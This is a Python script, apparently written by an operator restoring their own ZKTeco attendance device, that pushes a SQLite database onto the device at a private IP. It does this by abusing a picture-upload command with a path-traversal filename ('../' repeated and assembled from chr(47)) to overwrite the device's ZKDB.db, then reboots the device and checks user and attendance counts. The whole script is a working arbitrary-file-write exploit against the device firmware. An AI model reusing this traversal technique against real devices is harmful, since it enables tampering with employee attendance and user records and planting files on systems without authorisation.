#!/usr/bin/env python3
"""EMERGENCY RESTORE: Upload clean ZKDB.db to device."""
import sys
sys.path.insert(0, 'D:\\chamcong\\AttendanceSuite_Portable\\python\\Lib\\site-packages')
sys.stdout.reconfigure(encoding='utf-8')

import socket, struct, time, os
from zk import ZK, const
from struct import pack, unpack

DEVICE_IP = '172.16.0.214'
SOURCE_DB = 'D:\\chamcong\\zk_fw_attempts\\business_extracted\\000_ZKDB.db'  # 7.5MB clean SQLite

def send_cmd(conn, command, data=b''):
    try:
        return conn._ZK__send_command(command, data, response_size=1024)
    except Exception as e:
        return {'status': False, 'error': str(e)}

def upload_via_picture(conn, target_filename, data, chunk_size=0xFFc0):
    """Upload with configurable chunk size."""
    traversal = ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + target_filename
    filename = traversal.encode() + b'\x00'
    size = len(data)
    r1 = send_cmd(conn, const.CMD_PREPARE_DATA, pack('I', size))
    if not r1.get('status'): return {'error': 'PREPARE', 'r1': r1}
    remain = size % chunk_size
    packets = (size - remain) // chunk_size
    print('  Sending {} chunks of {} + {} remain'.format(packets, chunk_size, remain))
    failed = []
    for i in range(packets):
        r = send_cmd(conn, const.CMD_DATA, data[i*chunk_size:(i+1)*chunk_size])
        if not r.get('status'):
            failed.append(i)
            if len(failed) > 3:
                return {'error': 'too many failures', 'last': r}
    if remain:
        r = send_cmd(conn, const.CMD_DATA, data[packets*chunk_size:])
    r3 = send_cmd(conn, 0x272B, filename)
    return {'PREPARE': r1, 'UPLOAD': r3, 'failed_chunks': failed}

# Read clean source
with open(SOURCE_DB, 'rb') as f:
    clean_data = f.read()
print('[*] Clean ZKDB.db: {} bytes'.format(len(clean_data)))

# Connect and upload
zk = ZK(DEVICE_IP, port=4370, timeout=60, password=0)
conn = zk.connect()
print('[+] Connected:', conn.get_firmware_version())

try: conn.disable_device()
except: pass

print('\n[*] EMERGENCY UPLOAD clean ZKDB.db...')
t0 = time.time()
# Try with smaller chunks (32KB) to reduce failure rate
result = upload_via_picture(conn, 'mnt/mtdblock/data/ZKDB.db', clean_data, chunk_size=32768)
print('  Result:', result)
print('  Time: {:.1f}s'.format(time.time() - t0))

# Reboot
print('\n[*] Rebooting...')
try: conn.restart()
except Exception as e: print('  Err:', e)

try: conn.enable_device()
except: pass
try: conn.disconnect()
except: pass

print('\n[*] Waiting 25s...')
time.sleep(25)

print('\n[*] Reconnect + verify...')
try:
    zk2 = ZK(DEVICE_IP, port=4370, timeout=30, password=0)
    conn2 = zk2.connect()
    print('  Connected')
    try:
        users = conn2.get_users()
        print('  Users: {}'.format(len(users)))
    except Exception as e:
        print('  Users err:', e)
    try:
        att = conn2.get_attendance()
        print('  ATTLOG: {}'.format(len(att)))
    except Exception as e:
        print('  ATTLOG err:', e)
    conn2.disconnect()
except Exception as e:
    print('  Reconnect:', e)
